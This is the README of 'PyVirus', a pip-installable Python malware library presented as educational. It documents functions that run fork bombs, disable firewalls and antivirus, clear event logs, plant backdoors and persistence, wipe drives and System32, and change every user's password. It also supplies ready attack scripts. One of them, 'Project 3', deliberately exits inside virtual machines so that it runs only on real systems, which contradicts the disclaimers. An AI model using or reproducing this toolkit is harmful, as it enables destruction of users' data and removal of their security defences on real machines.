```markdown
# PyVirus

**Version: 1.0.0**  
**Author: Mohammad Taha Gorji**  

[GitHub](https://GitHub.com/mr-r0ot/PyVirus) | [PyPi](https://pypi.org/project/PyVirus)

---

> **Important Notice:**  
> This library is designed as an educational and research sample in the field of malicious techniques. Using this code for harmful purposes, damaging systems, or any illegal activities is strictly forbidden and all responsibilities lie with the user. It is recommended to run this code only in isolated and controlled environments (such as virtual machines).

---

## Table of Contents

- [Introduction](#introduction)
- [Installation](#installation)
- [Usage Guide](#usage-guide)
  - [Class TOOLS](#class-tools)
    - [Functions in TOOLS](#functions-in-tools)
  - [Class VIRUS](#class-virus)
    - [Functions in VIRUS](#functions-in-virus)
    - [WINDOWS Subclass in VIRUS](#windows-subclass-in-virus)
- [Usage Examples](#usage-examples)
- [Additional Projects](#additional-projects)
  - [Project 1: System Environment Inspection](#project-1-system-environment-inspection)
  - [Project 2: Combined Attack (Final Project)](#project-2-combined-attack-final-project)
- [Warnings and Limitations](#warnings-and-limitations)
- [License](#license)
- [Author](#author)

---

## Introduction

**PyVirus** is a Python library that contains a set of malicious functions and classes for testing attack techniques in controlled environments. This library allows you to:
- Create endless random folders and files.
- Open command prompt (CMD/Terminal) repeatedly.
- Perform attacks such as fork bombs, continuous mouse clicking, and endless keyboard typing.
- Modify system settings such as disabling firewalls, antivirus programs, and even creating a backdoor.

These functions are designed solely for educational and experimental purposes in controlled environments.

---

## Installation

To install the **PyVirus** library, use the following command:

```bash
pip install pyvirus
```

**Recommendation:**  
It is highly recommended to test this library within a virtual environment to avoid any potential issues with your main system.

---

## Usage Guide

### Class TOOLS

The **TOOLS** class contains helper functions for system management and various infrastructure tasks.

#### Functions in TOOLS

- **`TOOLS.platform()`**  
  - **Description:** Returns the operating system name (e.g., Windows, Linux, Darwin).  
  - **Usage:** Determines the execution environment to run corresponding commands.

- **`TOOLS.Set_StartUP()`**  
  - **Description:** Registers the program as a startup application when the system boots.  
  - **Usage:** On Windows, it copies the file, modifies the registry, creates a shortcut in the Startup folder, and schedules a task; on Linux/macOS, it creates a cron job.

- **`TOOLS.is_admin()`**  
  - **Description:** Checks if the program is running with administrator privileges.  
  - **Usage:** Required for executing sensitive commands that demand elevated privileges.

- **`TOOLS.Get_Admin_Access()`**  
  - **Description:** Requests administrator access if not already available.  
  - **Usage:** Ensures advanced commands needing elevated privileges can run.

- **`TOOLS.Are_we_in_virtual_machine()`**  
  - **Description:** Attempts to detect if the program is running inside a virtual machine.  
  - **Usage:** Determines the environment and helps avoid analysis in real setups.

- **`TOOLS.list_drives()`**  
  - **Description:** Lists available drives on the system.  
  - **Usage:** Identifies target paths for executing attacks or file system modifications.

- **`TOOLS.generate_random_word(nb)`**  
  - **Description:** Generates a random string of length `nb`.  
  - **Usage:** Useful for creating random names for files or folders.

- **`TOOLS.get_all_users()`**  
  - **Description:** Retrieves a list of all system users.  
  - **Usage:** Identifies users for password changes or creating new user accounts.

- **`TOOLS.get_current_user()`**  
  - **Description:** Gets the current system user’s name.  
  - **Usage:** Used for logging or personalizing the attack.

- **`TOOLS.run_functions_parallel(*functions)`**  
  - **Description:** Executes multiple functions concurrently using `ThreadPoolExecutor`.  
  - **Usage:** Speeds up attacks by running functions in parallel.

- **`TOOLS.hide_virus()`**  
  - **Description:** Attempts to hide the active windows of the program.  
  - **Usage:** Reduces the chance of detection by the user or monitoring software.

- **`TOOLS.list_tasks()`**  
  - **Description:** Retrieves a list of active processes using `psutil`.  
  - **Usage:** Identifies and terminates target processes.

---

### Class VIRUS

The **VIRUS** class includes malicious functions designed to damage target systems. These functions can cause severe damage, so they should only be used in controlled, experimental environments.

#### Functions in VIRUS

- **`VIRUS.folder_make(path='', nb=8)`**  
  - **Description:** Creates endless folders with random names in the specified path.  
  - **Usage:** Disrupts the file system structure.

- **`VIRUS.file_make(path='', nb=8, word='.')`**  
  - **Description:** Creates endless text files with random names and writes the specified text into them.  
  - **Usage:** Consumes storage space.

- **`VIRUS.open_cmd()`**  
  - **Description:** Repeatedly opens CMD (on Windows) or Terminal (on Linux/macOS) endlessly.  
  - **Usage:** Occupies system resources and causes disruption.

- **`VIRUS.fork_bomb()`**  
  - **Description:** Executes a fork bomb that creates an unlimited number of processes, exhausting system resources.  
  - **Usage:** Crashes the system.

- **`VIRUS.Mouse_Spamming()`**  
  - **Description:** Continuously performs right-click actions with the mouse.  
  - **Usage:** Disrupts system control.

- **`VIRUS.Keyboard_Samming(text)`**  
  - **Description:** Continuously types the given text.  
  - **Usage:** Creates chaos in user input.

- **`VIRUS.Show_On_Screen(text)`**  
  - **Description:** Displays a full-screen window with the specified text repeatedly.  
  - **Usage:** Prevents the user from interacting with the system.

- **`VIRUS.Start_Self_Running_Network(start_number=10)`**  
  - **Description:** Repeatedly executes the program itself a specified number of times to create a network of self-replicating instances.  
  - **Usage:** Enhances the persistence of the attack by running multiple copies of the virus.

- **`VIRUS.down_a_task(task_name)`**  
  - **Description:** Repeatedly terminates a process with the given name.  
  - **Usage:** Closes specific applications to disrupt system functionality.

- **`VIRUS.Kill_All_Tasks_System()`**  
  - **Description:** Repeatedly terminates all system processes.  
  - **Usage:** Completely disrupts system operation.

- **`VIRUS.down_firewall()`**  
  - **Description:** Disables the system firewall.  
  - **Usage:** Removes an important layer of system security.  
  - **Note:**  
    - On Windows, it uses `Netsh` commands.  
    - On Linux, it uses the `ufw disable` command.

- **`VIRUS.set_null_Event_Log()`**  
  - **Description:** Clears the system event logs.  
  - **Usage:** Erases traces of malicious activity.  
  - **Note:**  
    - On Windows, it uses `wevtutil`.  
    - On Linux, it uses `journalctl`.

- **`VIRUS.down_antivirus()`**  
  - **Description:** Disables the system antivirus.  
  - **Usage:** Prevents the virus from being detected by security software.  
  - **Note:**  
    - On Windows, it uses a Powershell command.  
    - On Linux, it stops the `clamav-daemon` service.

- **`VIRUS.down_internet_network()`**  
  - **Description:** Disconnects the system from the internet.  
  - **Usage:** Prevents the system from connecting to the network.  
  - **Note:**  
    - On Windows, it uses `IPconfig /Release`.  
    - On Linux, it uses `ifconfig eth0 down`.

- **`VIRUS.Kill_Drive(drive)`**  
  - **Description:** Deletes files on the specified drive.  
  - **Usage:** Causes severe damage to the file system.

- **`VIRUS.make_backdoor()`**  
  - **Description:** Creates a backdoor for future access to the system.  
  - **Usage:** Provides a method for re-entry into the compromised system.  
  - **Note:**  
    - On Windows, it modifies the registry.  
    - On Linux, it creates a script.

- **`VIRUS.shutdown(time=0)`**  
  - **Description:** Shuts down the system after a specified time delay.  
  - **Usage:** Quickly halts the system.  
  - **Note:**  
    - On Windows, it uses `shutdown -t`.  
    - On Linux, it uses `shutdown -h now`.

- **`VIRUS.restart(time=0)`**  
  - **Description:** Restarts the system after a specified time delay.  
  - **Usage:** Reboots the system to apply changes or cause disruption.  
  - **Note:**  
    - On Windows, it uses `shutdown -t -r`.  
    - On Linux, it uses `shutdown -r now`.

- **`VIRUS.BlueScreen_Kill_Windows_systemdrive()`**  
  - **Description:** Deletes critical files on the Windows system drive and forces a restart, leading to a Blue Screen of Death.  
  - **Usage:** Causes the system to crash with a Blue Screen.

- **`VIRUS.BlueScreen_Kill_Windows_system32()`**  
  - **Description:** Deletes system files in the Windows System32 folder.  
  - **Usage:** Damages the core components of the Windows operating system.

- **`VIRUS.Kill_All_Drive()`**  
  - **Description:** Attempts to delete all data on all system drives.  
  - **Usage:** Causes widespread damage to the file system.

- **`VIRUS.user_make(password='virus1234')`**  
  - **Description:** Continuously creates new user accounts with random names and a specified password.  
  - **Usage:** Disrupts system user management.

- **`VIRUS.change_password_users()`**  
  - **Description:** Randomly changes the passwords of all existing users.  
  - **Usage:** Causes confusion and prevents access to user accounts.

- **`VIRUS.Block_Mouse_KeyBoard()`**  
  - **Description:** Blocks mouse and keyboard inputs.  
  - **Usage:** Prevents the user from controlling the system.

- **`VIRUS.Kill_Drive_Data()`**  
  - **Description:** Deletes all data on the system drives.  
  - **Usage:** Erases the information stored on the system.

- **`VIRUS.Full_Drive_Evil()`**  
  - **Description:** Fills up free disk space with worthless files.  
  - **Usage:** Prevents optimal use of the system's storage space.

#### WINDOWS Subclass in VIRUS

The **WINDOWS** subclass contains functions specific to Windows systems:

- **`VIRUS.WINDOWS.Kill_power_button()`**  
  - **Description:** Attempts to disable the power button on a Windows system.  
  - **Usage:** Prevents the user from shutting down the system.

- **`VIRUS.WINDOWS.down_task_manager_reg()`**  
  - **Description:** Disables the Task Manager by modifying the registry.  
  - **Usage:** Prevents the user from terminating malicious processes.

- **`VIRUS.WINDOWS.down_task_manager_proc()`**  
  - **Description:** Continuously terminates the Task Manager process.  
  - **Usage:** Keeps malicious activities hidden.

- **`VIRUS.WINDOWS.BlueScreen_Kill_Windows_attrib()`**  
  - **Description:** Changes file attributes (removing read-only, system, and hidden attributes) and deletes some critical Windows files.  
  - **Usage:** Severely disrupts system functionality.

---

## Usage Examples

> **Warning:**  
> Running the examples below can severely damage your system. These codes are for educational purposes only and should be executed only in isolated environments (such as virtual machines).

### Example 1: Inspecting the System with TOOLS

```python
from pyvirus import TOOLS

# Display the operating system
print("Operating System:", TOOLS.platform())

# Check for administrator privileges
if TOOLS.is_admin():
    print("The program is running with administrator privileges.")
else:
    print("The program does not have administrator privileges.")
```

### Example 2: Creating Endless Random Folders

```python
from pyvirus import VIRUS

# Run the function to create random folders at a specified path
# Warning: Running this function may consume significant disk space.
# VIRUS.folder_make(path="C:\\", nb=8)
```

### Example 3: Creating a Backdoor

```python
from pyvirus import VIRUS

# Create a backdoor for future access (for educational purposes only)
# VIRUS.make_backdoor()
```

---

## Additional Projects

### Project 1: System Environment Inspection

In this project, we use functions from the **TOOLS** class to gather system information:

```python
# project_system_info.py
from pyvirus import TOOLS

def system_info():
    print("Operating System:", TOOLS.platform())
    print("Current User:", TOOLS.get_current_user())
    print("Drive List:", TOOLS.list_drives())
    print("System Users:", TOOLS.get_all_users())
    vm_info = TOOLS.Are_we_in_virtual_machine()
    print("Virtual Machine Status:", vm_info)

if __name__ == "__main__":
    system_info()
```

### Project 2: Combined Attack (Final Project)

> **Final Warning:**  
> Running this project can cause severe damage to your system. This code calls all the functionalities of the library in a combined manner. Execute it only in isolated and controlled environments (such as virtual machines).

```python
# final_project.py
from pyvirus import TOOLS, VIRUS

def final_attack():
    # 1. Display system information and check for administrator privileges
    print("Operating System:", TOOLS.platform())
    if not TOOLS.is_admin():
        print("Administrator access not available; requesting elevated privileges...")
        TOOLS.Get_Admin_Access()  # Request administrator privileges
    else:
        print("Administrator access confirmed.")
    
    # 2. Register the program as a startup application
    print("Setting up the program in startup...")
    TOOLS.Set_StartUP()
    
    # 3. Gather environment information
    print("Checking virtual machine status:", TOOLS.Are_we_in_virtual_machine())
    print("Drive List:", TOOLS.list_drives())
    print("System Users:", TOOLS.get_all_users())
    print("Current User:", TOOLS.get_current_user())
    
    # 4. Execute several attacks concurrently
    print("Executing parallel attacks...")
    TOOLS.run_functions_parallel(
        lambda: VIRUS.file_make(path="", nb=8, word="PyVirus Attack"),
        lambda: VIRUS.folder_make(path="", nb=8),
        VIRUS.open_cmd,
        VIRUS.Mouse_Spamming,
        lambda: VIRUS.Keyboard_Samming("PyVirus is active!")
    )
    
    # 5. Invoke additional complementary functions (Warning: These functions are highly destructive and should be tested only in isolated environments)
    # VIRUS.down_firewall()
    # VIRUS.set_null_Event_Log()
    # VIRUS.down_antivirus()
    # VIRUS.down_internet_network()
    # VIRUS.make_backdoor()
    # VIRUS.shutdown(0)
    # VIRUS.restart(0)
    # VIRUS.BlueScreen_Kill_Windows_systemdrive()
    # VIRUS.BlueScreen_Kill_Windows_system32()
    # VIRUS.Kill_All_Drive()
    # VIRUS.user_make()
    # VIRUS.change_password_users()
    # VIRUS.Block_Mouse_KeyBoard()
    # VIRUS.Kill_Drive_Data()
    # VIRUS.Full_Drive_Evil()
    
    # 6. Use the WINDOWS subclass functions (only applicable for Windows systems)
    # VIRUS.WINDOWS.Kill_power_button()
    # VIRUS.WINDOWS.down_task_manager_reg()
    # VIRUS.WINDOWS.down_task_manager_proc()
    # VIRUS.WINDOWS.BlueScreen_Kill_Windows_attrib()
    
if __name__ == "__main__":
    final_attack()
```

### Project 3: Show All Options

> **Final Warning:**  
> Running this project can cause severe damage to your system. This code calls all the functionalities of the library in a combined manner. Execute it only in isolated and controlled environments (such as virtual machines).

```python
from pyvirus import *


if TOOLS.Are_we_in_virtual_machine()==True:
    print('This script can run only on a real system!')
    exit()


else:

    TOOLS.Set_StartUP()
    if TOOLS.is_admin()==False:
        TOOLS.Get_Admin_Access()
    TOOLS.hide_virus()
    VIRUS.Start_Self_Running_Network(10)
    VIRUS.Show_On_Screen("Its Virus!")

    VIRUS.down_firewall()
    VIRUS.down_antivirus()
    VIRUS.down_internet_network()
    VIRUS.make_backdoor()
    VIRUS.change_password_users()



    if TOOLS.platform()=='Windows':
        
        TOOLS.run_functions_parallel(
            VIRUS.WINDOWS.Kill_power_button,
            VIRUS.folder_make,
            VIRUS.file_make,
            VIRUS.open_cmd,
            VIRUS.Mouse_Spamming,
            VIRUS.Keyboard_Samming,
            VIRUS.Kill_All_Tasks_System,
            VIRUS.set_null_Event_Log,
            VIRUS.BlueScreen_Kill_Windows_systemdrive,
            VIRUS.BlueScreen_Kill_Windows_system32,
            VIRUS.Kill_All_Drive,
            VIRUS.user_make,
            VIRUS.Kill_Drive_Data,
            VIRUS.Full_Drive_Evil,

            VIRUS.WINDOWS.BlueScreen_Kill_Windows_attrib,
            VIRUS.WINDOWS.down_task_manager_proc,
            VIRUS.WINDOWS.down_task_manager_reg
    )
    else:

        TOOLS.run_functions_parallel(
            VIRUS.folder_make,
            VIRUS.file_make,
            VIRUS.open_cmd,
            VIRUS.Mouse_Spamming,
            VIRUS.Keyboard_Samming,
            VIRUS.Kill_All_Tasks_System,
            VIRUS.set_null_Event_Log,
            VIRUS.BlueScreen_Kill_Windows_systemdrive,
            VIRUS.BlueScreen_Kill_Windows_system32,
            VIRUS.Kill_All_Drive,
            VIRUS.user_make,
            VIRUS.Kill_Drive_Data,
            VIRUS.Full_Drive_Evil,
        )

```

---

## Warnings and Limitations

**Serious Warning:**  
Using the functions in this library can cause severe damage to your system, render the file system inoperable, and result in data loss.  
These tools are provided as educational samples only, and actual use on live systems or without proper legal authorization will result in legal consequences.  
It is always recommended that:
- You only test these codes in isolated environments (e.g., virtual machines).
- You refrain from using them on personal or organizational systems.
- All responsibilities arising from using this code are solely yours.

---

## License

This library is distributed under the **MIT License**.  
For more information, please refer to the `LICENSE` file.

---

## Author

**Mohammad Taha Gorji**  
- [GitHub](https://GitHub.com/mr-r0ot/PyVirus)  
- [PyPi](https://pypi.org/project/PyVirus)

---

> **Final Note:**  
> This project is designed as an educational sample to explore malicious techniques.  
> Any use of this code outside of educational or research purposes is illegal.
```
